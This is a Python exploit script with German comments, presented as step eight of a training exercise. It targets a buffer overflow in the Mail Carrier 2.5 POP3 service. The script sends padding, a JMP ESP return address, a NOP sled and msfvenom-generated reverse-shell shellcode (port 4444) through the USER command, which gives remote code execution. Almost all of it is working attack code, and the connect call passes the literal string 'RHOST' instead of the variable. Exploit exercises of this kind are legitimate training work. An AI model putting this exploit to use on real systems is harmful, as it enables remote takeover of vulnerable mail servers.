# coding=utf-8
# -------------Mail Carrier 2.5 Buffer Overflow Exploit Uebung  -------------------------
# ---------------------------------------------------------------------------------------
# Entwickeln eines Buffer Overflow Exploits mit Remote Code Execution von Grund auf------
# ---------------------------------------------------------------------------------------
# Schritt 8: Finaler Exploit mit Root Reverse Shell auf Port 4444 und Exit Function ohne-
# ---------- das Programm zu crashen
# ---------------------------------------------------------------------------------------

import socket, time

# Ip des Windows Clients
RHOST = "10.10.10.12"

# Padding bis EIP
padding_start = "\x41" * 5098

# Gefundene Bad Characters: "\x00
# Aus MSF NASM Shell: JMP ESP \xff\xe4
# Addresse: 0x0fa14923 0fa14ccf 0fa1436f im Little Endian Format
EIP = "\x23\x49\xa1\x0f"

# Neuer Shell Code mit Exit Function "Thread"
# msfvenom -p windows/shell_reverse_tcp LHOST=<eigene ip> LPORT=4444 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00"

# NOP Sled vor unserem Shell Code
NOP = "\x90" * 16

shellcode = "\xbf\x91\x9f\xc8\x82\xd9\xe1\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
shellcode += "\x52\x83\xe8\xfc\x31\x78\x0e\x03\xe9\x91\x2a\x77\xf5\x46\x28"
shellcode += "\x78\x05\x97\x4d\xf0\xe0\xa6\x4d\x66\x61\x98\x7d\xec\x27\x15"
shellcode += "\xf5\xa0\xd3\xae\x7b\x6d\xd4\x07\x31\x4b\xdb\x98\x6a\xaf\x7a" 
shellcode += "\x1b\x71\xfc\x5c\x22\xba\xf1\x9d\x63\xa7\xf8\xcf\x3c\xa3\xaf"
shellcode += "\xff\x49\xf9\x73\x74\x01\xef\xf3\x69\xd2\x0e\xd5\x3c\x68\x49"
shellcode += "\xf5\xbf\xbd\xe1\xbc\xa7\xa2\xcc\x77\x5c\x10\xba\x89\xb4\x68"
shellcode += "\x43\x25\xf9\x44\xb6\x37\x3e\x62\x29\x42\x36\x90\xd4\x55\x8d"
shellcode += "\xea\x02\xd3\x15\x4c\xc0\x43\xf1\x6c\x05\x15\x72\x62\xe2\x51"
shellcode += "\xdc\x67\xf5\xb6\x57\x93\x7e\x39\xb7\x15\xc4\x1e\x13\x7d\x9e"
shellcode += "\x3f\x02\xdb\x71\x3f\x54\x84\x2e\xe5\x1f\x29\x3a\x94\x42\x26"
shellcode += "\x8f\x95\x7c\xb6\x87\xae\x0f\x84\x08\x05\x87\xa4\xc1\x83\x50"
shellcode += "\xca\xfb\x74\xce\x35\x04\x85\xc7\xf1\x50\xd5\x7f\xd3\xd8\xbe"
shellcode += "\x7f\xdc\x0c\x10\x2f\x72\xff\xd1\x9f\x32\xaf\xb9\xf5\xbc\x90"
shellcode += "\xda\xf6\x16\xb9\x71\x0d\xf1\xcc\x8f\x07\x05\xb9\x8d\x17\x14"
shellcode += "\x65\x1b\xf1\x7c\x85\x4d\xaa\xe8\x3c\xd4\x20\x88\xc1\xc2\x4d"
shellcode += "\x8a\x4a\xe1\xb2\x45\xbb\x8c\xa0\x32\x4b\xdb\x9a\x95\x54\xf1"
shellcode += "\xb2\x7a\xc6\x9e\x42\xf4\xfb\x08\x15\x51\xcd\x40\xf3\x4f\x74"
shellcode += "\xfb\xe1\x8d\xe0\xc4\xa1\x49\xd1\xcb\x28\x1f\x6d\xe8\x3a\xd9"
shellcode += "\x6e\xb4\x6e\xb5\x38\x62\xd8\x73\x93\xc4\xb2\x2d\x48\x8f\x52"
shellcode += "\xab\xa2\x10\x24\xb4\xee\xe6\xc8\x05\x47\xbf\xf7\xaa\x0f\x37"
shellcode += "\x80\xd6\xaf\xb8\x5b\x53\xcf\x5a\x49\xae\x78\xc3\x18\x13\xe5"
shellcode += "\xf4\xf7\x50\x10\x77\xfd\x28\xe7\x67\x74\x2c\xa3\x2f\x65\x5c"
shellcode += "\xbc\xc5\x89\xf3\xbd\xcf"

# Zusammensetzen der Payload
# Da wir konsistent viele Zeichen immer senden wollen um immer den Gleichen crash zu produzieren hängen wir noch ein
# Padding aus Cs ans Ende

payload = padding_start + EIP + NOP + shellcode + (500 - len(NOP) - len(shellcode))*"\x43"

print("[+] Sending Payload...")
# Verbindung zum Windows Client aufbauen
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("RHOST", 110))
# Empfang von Daten wenn der Server antwortet
print(connection.recv(1024))

# Senden der Zeichenkette
connection.send("USER " + payload + "\r\n")
# Emfang wenn der Username angenommen wird und Daten zurück gesendet werden. Zeigt uns dass der crash nicht funktioniert
print(connection.recv(1024))
# Geregeltes schliessen der Verbindung
connection.send("QUIT\r\n")
print(connection.recv(1024))
connection.close()
